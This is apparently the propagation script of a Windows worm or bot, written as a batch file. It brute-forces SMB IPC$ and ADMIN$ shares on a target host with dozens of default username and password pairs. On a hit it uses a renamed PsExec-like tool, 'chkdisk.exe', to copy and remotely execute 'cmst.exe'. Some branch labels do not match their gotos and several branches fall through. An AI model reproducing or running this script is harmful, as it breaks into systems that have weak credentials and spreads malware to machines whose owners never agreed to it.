@echo off
:begin
net use /del \\%1\ipc$
net use \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto blkad
net use \\%1\ipc$ "administrator" /user:administrator
if not errorlevel 1 goto adad

net use \\%1\ipc$ "test" /user:administrator
if not errorlevel 1 goto adtest

net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt

net use \\%1\ipc$ "test123" /user:administrator
if not errorlevel 1 goto adtestt

net use \\%1\ipc$ "temp" /user:administrator
if not errorlevel 1 goto adtemp

net use \\%1\ipc$ "temp123" /user:administrator
if not errorlevel 1 goto adtempp

net use \\%1\ipc$ "pass" /user:administrator
if not errorlevel 1 goto adpass

net use \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto adpassw

net use \\%1\ipc$ "admin" /user:administrator
if not errorlevel 1 goto adadmin

net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto rootroot

net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto adminad

net use \\%1\ipc$ "winblows" /user:admin
if not errorlevel 1 goto adpassw1

net use \\%1\ipc$ "1" /user:admin
if not errorlevel 1 goto adpassw2

net use \\%1\ipc$ "a" /user:admin
if not errorlevel 1 goto adpassw3

net use \\%1\ipc$ "" /user:guest
if not errorlevel 1 goto adpass4

net use \\%1\ipc$ "a" /user:guest
if not errorlevel 1 goto adpass5

net use \\%1\ipc$ "ab" /user:guest
if not errorlevel 1 goto adpass6

net use \\%1\ipc$ "abc" /user:guest
if not errorlevel 1 goto adpass7

net use \\%1\ipc$ "a" /user:root
if not errorlevel 1 goto adpass8

net use \\%1\ipc$ "ab" /user:root
if not errorlevel 1 goto adpass9

net use \\%1\ipc$ "abc" /user:root
if not errorlevel 1 goto adpass10

net use \\%1\ipc$ "abcd" /user:root
if not errorlevel 1 goto adpass11

net use \\%1\ADMIN$ "" /user:sa
if not errorlevel 1 goto sa2

net use \\%1\ADMIN$ "" /user:administrator
if not errorlevel 1 goto blkad2

net use \\%1\ADMIN$ "" /user:amministratore
if not errorlevel 1 goto amministratore2

net use \\%1\ADMIN$ "" /user:forsterkning
if not errorlevel 1 goto forsterkning2

net use \\%1\ADMIN$ "" /user:Verwalter
if not errorlevel 1 goto Verwalter2

net use \\%1\ADMIN$ "" /user:user
if not errorlevel 1 goto userblank2

net use \\%1\ADMIN$ "" /user:administrador
if not errorlevel 1 goto spanishadmin2

net use \\%1\ADMIN$ "administrador" /user:administrador
if not errorlevel 1 goto spanishadmin22

net use \\%1\ADMIN$ "default" /user:default
if not errorlevel 1 goto defdef2

net use \\%1\ADMIN$ "default" /user:user
if not errorlevel 1 goto defpass2

net use \\%1\ADMIN$ "user" /user:default
if not errorlevel 1 goto userdef2

net use \\%1\ADMIN$ "user" /user:user
if not errorlevel 1 goto useruser2

net use \\%1\ADMIN$ "12345" /user:administrator
if not errorlevel 1 goto administrator123452

net use \\%1\ADMIN$ "password" /user:administrator
if not errorlevel 1 goto administratorpassword2

net use \\%1\ADMIN$ "1234" /user:administrator
if not errorlevel 1 goto administrator12342

net use \\%1\ADMIN$ "123" /user:administrator
if not errorlevel 1 goto administrator1232

net use \\%1\ADMIN$ "123456" /user:administrator
if not errorlevel 1 goto administrator1234562

net use \\%1\ADMIN$ "administrator" /user:admin
if not errorlevel 1 goto adminadministrator2

net use \\%1\ipc$ "" /user:administrator

net use \\%1\ipc$ "" /user:administrateur

net use \\%1\ipc$ "" /user:admin

net use \\%1\ipc$ "" /user:wwwadmin

net use \\%1\ipc$ "" /user:database

net use \\%1\ipc$ "" /user:user

net use \\%1\ipc$ "" /user:test

net use \\%1\ipc$ "" /user:root

net use \\%1\ipc$ "" /user:server

net use \\%1\ipc$ "" /user:%username%

net use \\%1\ipc$ "%username%" /user:%username%

net use \\%1\ipc$ "12345" /user:%username%

net use \\%1\ipc$ "admin" /user:%username%

net use \\%1\ipc$ "admin" /user:wwwadmin

net use \\%1\ipc$ "wwwadmin" /user:wwwadmin

net use \\%1\ipc$ "database" /user:database

net use \\%1\ipc$ "admin" /user:database

net use \\%1\ipc$ "user" /user:user

net use \\%1\ipc$ "admin" /user:user

net use \\%1\ipc$ "admin" /user:Administrator

net use \\%1\ipc$ "admin" /user:administrator

net use \\%1\ipc$ "admin123" /user:administrator

net use \\%1\ipc$ "password" /user:administrato

net use \\%1\ipc$ "administrator" /user:administrator

net use \\%1\ipc$ "changeme" /user:administrator

net use \\%1\ipc$ "private" /user:administrator

net use \\%1\ipc$ "root" /user:root

net use \\%1\ipc$ "admin" /user:admin

net use \\%1\ipc$ "1" /user:administrator

net use \\%1\ipc$ "12" /user:administrator

net use \\%1\ipc$ "123" /user:administrator

net use \\%1\ipc$ "1234" /user:administrator

net use \\%1\ipc$ "12345" /user:Administrator

net use \\%1\ipc$ "123456" /user:administrator

net use \\%1\ipc$ "secret" /user:administrator

net use \\%1\ipc$ "test" /user:test

net use \\%1\ipc$ "test123" /user:test

if not errorlevel 1 goto rand
goto end
:blkad
chkdisk.exe \\%1 -u administrator -p "" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "" -d cmst.exe -o
goto end
:adad
chkdisk.exe \\%1 -u administrator -p "admin" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "admin" -d cmst.exe -o
goto end
:adadmin
chkdisk.exe \\%1 -u administrator -p "administrator" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "administrator" -d cmst.exe -o
goto end
:rootroot
chkdisk.exe \\%1 -u root -p "root" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u root -p "root" -d cmst.exe -o
goto end
:adminad
chkdisk.exe \\%1 -u admin -p "admin" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u admin -p "admin" -d cmst.exe -o
goto end
:adtest
chkdisk.exe \\%1 -u administrator -p "test" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "test" -d cmst.exe -o
goto end
:testt
chkdisk.exe \\%1 -u test -p "test" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u test -p "test" -d cmst.exe -o
goto end
:adtestt
chkdisk.exe \\%1 -u administrator -p "test123" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "test123" -d cmst.exe -o
goto end
:adtemp
chkdisk.exe \\%1 -u administrator -p "temp" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "temp" -d cmst.exe -o
goto end
:adtempp
chkdisk.exe \\%1 -u administrator -p "temp123" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "temp123" -d cmst.exe -o
goto end
:adpass
chkdisk.exe \\%1 -u administrator -p "pass" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "pass" -d cmst.exe -o
goto end
:adpassw
chkdisk.exe \\%1 -u administrator -p "password" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "password" -d cmst.exe -o
goto end
:adpass1
chkdisk.exe \\%1 -u administrator -p "winblows" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "winblows" -d cmst.exe -o
goto end
:adpass2
chkdisk.exe \\%1 -u administrator -p "1" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "1" -d cmst.exe -o
goto end
:adpass3
chkdisk.exe \\%1 -u administrator -p "a" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u administrator -p "a" -d cmst.exe -o
:adpass4
chkdisk.exe \\%1 -u guest -p "" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u guest -p "" -d cmst.exe -o
:adpass5
chkdisk.exe \\%1 -u guest -p "ab" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u guest -p "ab" -d cmst.exe -o
:adpass6
chkdisk.exe \\%1 -u guest -p "abc" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u guest -p "abc" -d cmst.exe -o
:adpass7
chkdisk.exe \\%1 -u root -p "a" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u root -p "a" -d cmst.exe -o
:adpass8
chkdisk.exe \\%1 -u root -p "ab" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u root -p "ab" -d cmst.exe -o
:adpass9
chkdisk.exe \\%1 -u root -p "abc" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u root -p "abc" -d cmst.exe -o
:adpass10
chkdisk.exe \\%1 -u root -p "abcd" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u root -p "abcd" -d cmst.exe -o
:adpass11
chkdisk.exe \\%1 -u admin -p "abc" -f -c -d cmst.exe -o
chkdisk.exe \\%1 -u admin -p "abc" -d cmst.exe -o
:rand
chkdisk.exe \\%1 -f -c -d cmst.exe -o
chkdisk.exe \\%1 -d cmst.exe -o
goto end
:sa2
chkdisk.exe \\%1 -u sa -p "" -f -c -d cmst.exe -o
goto end
:blkad2
chkdisk.exe \\%1 -u administrator -p "" -f -c -d cmst.exe -o
goto end
:amministratore2
chkdisk.exe \\%1 -u amministratore -p "" -f -c -d cmst.exe -o
goto end
:forsterkning2
chkdisk.exe \\%1 -u forsterkning -p "" -f -c -d cmst.exe -o
goto end
:Verwalter2
chkdisk.exe \\%1 -u Verwalter -p "" -f -c -d cmst.exe -o
goto end
:userblank2
chkdisk.exe \\%1 -u user -p "" -f -c -d cmst.exe -o
goto end
:spanishadmin2
chkdisk.exe \\%1 -u administrador -p "" -f -c -d cmst.exe -o
goto end
:spanishadmin22
chkdisk.exe \\%1 -u administrador -p "administrador" -f -c -d cmst.exe -o
:end
:defdef2
chkdisk.exe \\%1 -u default -p "default" -f -c -d cmst.exe -o
goto end
:defpass2
chkdisk.exe \\%1 -u user -p "default" -f -c -d cmst.exe -o
goto end
:userdef2
chkdisk.exe \\%1 -u default -p "user" -f -c -d cmst.exe -o
goto end
:useruser2
chkdisk.exe \\%1 -u user -p "user" -f -c -d cmst.exe -o
goto end
:administrator123452
chkdisk.exe \\%1 -u administrator -p "12345" -f -c -d cmst.exe -o
goto end
:administratorpassword2
chkdisk.exe \\%1 -u administrator -p "password" -f -c -d cmst.exe -o
goto end
:administrator12342
chkdisk.exe \\%1 -u administrator -p "1234" -f -c -d cmst.exe -o
goto end
:administrator1232
chkdisk.exe \\%1 -u administrator -p "123" -f -c -d cmst.exe -o
goto end
:administrator1234562
chkdisk.exe \\%1 -u administrator -p "123456" -f -c -d cmst.exe -o
goto end
:adminadministrator2
chkdisk.exe \\%1 -u admin -p "administrator" -f -c -d cmst.exe -o
goto end
:end
exit
